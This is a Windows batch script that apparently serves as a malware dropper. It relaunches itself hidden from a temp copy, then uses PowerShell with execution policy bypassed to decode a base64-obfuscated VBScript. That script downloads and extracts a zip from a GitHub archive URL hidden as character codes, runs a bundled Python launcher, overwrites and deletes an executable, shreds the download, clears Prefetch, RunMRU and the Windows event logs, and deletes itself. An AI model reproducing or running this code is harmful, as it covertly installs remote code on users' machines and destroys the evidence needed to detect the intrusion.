@echo off
setlocal enabledelayedexpansion

if not "%1"=="w" (
    set "tb=%TEMP%\~!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tb!" >nul 2>&1
    if exist "!tb!" (
        start /b cmd /c call "!tb!" w
        timeout /t 1 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "vf=%TEMP%\~i!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$a='T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKc2NyaXB0UGF0aCA9IFdTY3JpcHQuU2NyaXB0RnVsbE5hbWUKc2NyaXB0TmFtZSA9IGZzby5HZXRGaWxlTmFtZShzY3JpcHRQYXRoKQpzY3JpcHREaXIgPSBmc28uR2V0UGFyZW50Rm9sZGVyTmFtZShzY3JpcHRQYXRoKQp0ZW1wQmFzZSA9IHNoZWxsLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVRFTVAlIikKSWYgSW5TdHIoTENhc2Uoc2NyaXB0UGF0aCksIExDYXNlKHRlbXBCYXNlKSkgPiAwIEFuZCBMQ2FzZShzY3JpcHROYW1lKSA9ICJjb3JlLnZicyIgVGhlbgpleGVQYXRoID0gIiIKRm9yIEVhY2ggZiBJbiBmc28uR2V0Rm9sZGVyKHNjcmlwdERpcikuRmlsZXMKSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgpleGVQYXRoID0gZi5QYXRoCkV4aXQgRm9yCkVuZCBJZgpOZXh0CkRpbSB1cmxQYXJ0cygxNCkKdXJsUGFydHMoMCkgPSAiaDEwOSIKdXJsUGFydHMoMSkgPSAiMTE2Igp1cmxQYXJ0cygyKSA9ICIxMTYiCnVybFBhcnRzKDMpID0gIjExMiIKdXJsUGFydHMoNCkgPSAiMTE1Igp1cmxQYXJ0cyg1KSA9ICI1OCIKdXJsUGFydHMoNikgPSAiNDciCnVybFBhcnRzKDcpID0gIjQ3Igp1cmxQYXJ0cyg4KSA9ICIxMDMiCnVybFBhcnRzKDkpID0gIjEwNSIKdXJsUGFydHMoMTApID0gIjExNiIKdXJsUGFydHMoMTEpID0gIjEwNCIKdXJsUGFydHMoMTIpID0gIjExNyIKdXJsUGFydHMoMTMpID0gIjk4Igp1cmxQYXJ0cygxNCkgPSAiNDYiCnJlcG9VUkwgPSAiIgpGb3IgaSA9IDAgVG8gMTQKcmVwb1VSTCA9IHJlcG9VUkwgJiBDaHIoQ0ludCh1cmxQYXJ0cyhpKSkpCk5leHQKcmVwb1VSTCA9IHJlcG9VUkwgJiAiY29tL2JyYXlhbmpob2FuY2UyLWNvbGxhYi9lbmNyaXB0YWRvL2FyY2hpdmUvcmVmcy9oZWFkcy9tYWluLnppcCIKemlwUGF0aCA9IHNjcmlwdERpciAmICJccmVwby56aXAiCmV4dHJhY3RQYXRoID0gc2NyaXB0RGlyICYgIlxleHRyYWN0ZWQiCnBzRG93bmxvYWQgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICIiIiIgJiBfCiJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyOyAiICYgXwoiJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KInRyeSB7ICIgJiBfCiIgICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnIiAmIHJlcG9VUkwgJiAiJyAtT3V0RmlsZSAnIiAmIHppcFBhdGggJiAiJyAtVXNlQmFzaWNQYXJzaW5nIC1UaW1lb3V0U2VjIDEyMCAtVXNlckFnZW50ICdNb3ppbGxhLzUuMChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNic7ICIgJiBfCiIgICAgRXhwYW5kLUFyY2hpdmUgLVBhdGggJyIgJiB6aXBQYXRoICYgIicgLURlc3RpbmF0aW9uUGF0aCAnIiAmIGV4dHJhY3RQYXRoICYgIicgLUZvcmNlICIgJiBfCiJ9IGNhdGNoIHsgZXhpdCAxIH0gIiAmIF8KIiIiIgpzaGVsbC5SdW4gcHNEb3dubG9hZCwgMCwgVHJ1ZQpXU2NyaXB0LlNsZWVwIDgwMDAKSWYgTm90IGZzby5GaWxlRXhpc3RzKHppcFBhdGgpIFRoZW4KV1NjcmlwdC5RdWl0CkVuZCBJZgpXU2NyaXB0LlNsZWVwIDIwMDAKcmVwb1BhdGggPSAiIgpsYXVuY2hlclBhdGggPSAiIgpweXRob25QYXRoID0gIiIKSWYgZnNvLkZvbGRlckV4aXN0cyhleHRyYWN0UGF0aCkgVGhlbgpGb3IgRWFjaCBzdWJmb2xkZXIgSW4gZnNvLkdldEZvbGRlcihleHRyYWN0UGF0aCkuU3ViRm9sZGVycwpJZiBMQ2FzZShzdWJmb2xkZXIuTmFtZSkgPSAiZW5jcmlwdGFkby1tYWluIiBUaGVuCnJlcG9QYXRoID0gc3ViZm9sZGVyLlBhdGgKbGF1bmNoZXJQYXRoID0gcmVwb1BhdGggJiAiXGxhdW5jaGVyLnB5IgpweXRob25QYXRoID0gcmVwb1BhdGggJiAiXHB5dGhvbl9wb3J0YWJsZVxweXRob24uZXhlIgpFeGl0IEZvcgpFbmQgSWYKTmV4dApFbmQgSWYKSWYgcmVwb1BhdGggPD4gIiIgQW5kIGZzby5GaWxlRXhpc3RzKGxhdW5jaGVyUGF0aCkgQW5kIGZzby5GaWxlRXhpc3RzKHB5dGhvblBhdGgpIFRoZW4Kc2hlbGwuQ3VycmVudERpcmVjdG9yeSA9IHJlcG9QYXRoCmNtZExhdW5jaCA9ICIiIiIgJiBweXRob25QYXRoICYgIiIiICIiIiAmIGxhdW5jaGVyUGF0aCAmICIiIgpzaGVsbC5SdW4gY21kTGF1bmNoLCAwLCBGYWxzZQpXU2NyaXB0LlNsZWVwIDEwMDAwCkVuZCBJZgpJZiBleGVQYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhleGVQYXRoKSBUaGVuCkZvciBpID0gMSBUbyAzClNldCBmdyA9IGZzby5PcGVuVGV4dEZpbGUoZXhlUGF0aCwgMikKRm9yIGogPSAxIFRvIDEwMDAKZncuV3JpdGVMaW5lIFN0cmluZyg4MCwgQ2hyKEludChSbmQgKiAyNikgKyA2NSkpCk5leHQKZncuQ2xvc2UKV1NjcmlwdC5TbGVlcCAyMDAKTmV4dApmc28uRGVsZXRlRmlsZSBleGVQYXRoLCBUcnVlCkVuZCBJZgpXU2NyaXB0LlNsZWVwIDIwMDAKSWYgZnNvLkZpbGVFeGlzdHMoemlwUGF0aCkgVGhlbgp6aXBTaXplID0gZnNvLkdldEZpbGUoemlwUGF0aCkuU2l6ZQpJZiB6aXBTaXplID4gMCBBbmQgemlwU2l6ZSA8IDEwMDAwMDAwMCBUaGVuCkZvciBwYXNzID0gMSBUbyA1CnBzU2hyZWQgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiIiIiICYgXwoiJGJ5dGVzID0gTmV3LU9iamVjdCBieXRlW10gIiAmIHppcFNpemUgJiAiOyAiICYgXwoiKE5ldy1PYmplY3QgUmFuZG9tKS5OZXh0Qnl0ZXMoJGJ5dGVzKTsgIiAmIF8KIltJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygnIiAmIHppcFBhdGggJiAiJywgJGJ5dGVzKSAiICYgXwoiIiIiCnNoZWxsLlJ1biBwc1NocmVkLCAwLCBUcnVlCldTY3JpcHQuU2xlZXAgNTAwCk5leHQKRW5kIElmCmZzby5EZWxldGVGaWxlIHppcFBhdGgsIFRydWUKRW5kIElmCnNoZWxsLlJlZ0RlbGV0ZSAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxSdW5NUlVcIgpwc0NsZWFyID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgIiIiIiAmIF8KIiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZSc7ICIgJiBfCiJSZW1vdmUtSXRlbSAnQzpcV2luZG93c1xQcmVmZXRjaFwqLnBmJyAtRm9yY2U7ICIgJiBfCiJ3ZXZ0dXRpbCBjbCBBcHBsaWNhdGlvbiAyPiRudWxsOyAiICYgXwoid2V2dHV0aWwgY2wgU3lzdGVtIDI+JG51bGw7ICIgJiBfCiJ3ZXZ0dXRpbCBjbCBTZWN1cml0eSAyPiRudWxsICIgJiBfCiIiIiIKc2hlbGwuUnVuIHBzQ2xlYXIsIDAsIFRydWUKV1NjcmlwdC5TbGVlcCAyMDAwCmNsZWFudXBCYXQgPSBzY3JpcHREaXIgJiAiXGNsZWFudXAuYmF0IgpTZXQgZmMgPSBmc28uQ3JlYXRlVGV4dEZpbGUoY2xlYW51cEJhdCwgVHJ1ZSkKZmMuV3JpdGVMaW5lICJAZWNobyBvZmYiCmZjLldyaXRlTGluZSAidGltZW91dCAvdCAxMCAvbm9icmVhayA+bnVsIgpmYy5Xcml0ZUxpbmUgInRhc2traWxsIC9mIC9pbSB3c2NyaXB0LmV4ZSA+bnVsIDI+JjEiCmZjLldyaXRlTGluZSAiZGVsIC9mIC9xICIiIiIgJiBzY3JpcHRQYXRoICYgIiIiIiA+bnVsIDI+JjEiCmZjLldyaXRlTGluZSAiY2QgL2QgJVRFTVAlIgpmYy5Xcml0ZUxpbmUgInJtZGlyIC9zIC9xICIiIiIgJiBzY3JpcHREaXIgJiAiIiIiID5udWwgMj4mMSIKZmMuV3JpdGVMaW5lICJyZWcgZGVsZXRlIEhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVIC9mID5udWwgMj4mMSIKZmMuV3JpdGVMaW5lICIoZ290bykgMj5udWwgJiBkZWwgL2YgL3EgIiIlfjBmMCIiICYgZXhpdCIKZmMuQ2xvc2UKc2hlbGwuUnVuICJjbWQuZXhlIC9jICIiIiIgJiBjbGVhbnVwQmF0ICYgIiIiIiIsIDAsIEZhbHNlCldTY3JpcHQuUXVpdApFbHNlCnRlbXBJRCA9ICJzeXNfIiAmIEludChSbmQgKiA5OTk5OTkgKyAxMDAwMDApCnRlbXBXb3JrID0gdGVtcEJhc2UgJiAiXCIgJiB0ZW1wSUQKZnNvLkNyZWF0ZUZvbGRlciB0ZW1wV29yawp2YnNUZW1wID0gdGVtcFdvcmsgJiAiXGNvcmUudmJzIgpmc28uQ29weUZpbGUgc2NyaXB0UGF0aCwgdmJzVGVtcCwgVHJ1ZQpzaGVsbC5SdW4gIndzY3JpcHQuZXhlICIiIiIgJiB2YnNUZW1wICYgIiIiIiAvL0IgLy9Ob2xvZ28iLCAwLCBGYWxzZQpXU2NyaXB0LlNsZWVwIDEwMDAKZnNvLkRlbGV0ZUZpbGUgc2NyaXB0UGF0aCwgVHJ1ZQpXU2NyaXB0LlF1aXQKRW5kIElm';$b=[Convert]::FromBase64String($a);[IO.File]::WriteAllBytes('%vf%',$b)"

timeout /t 2 /nobreak >nul

if exist "%vf%" (
    start /b wscript.exe "%vf%" //B //Nologo
    timeout /t 3 /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit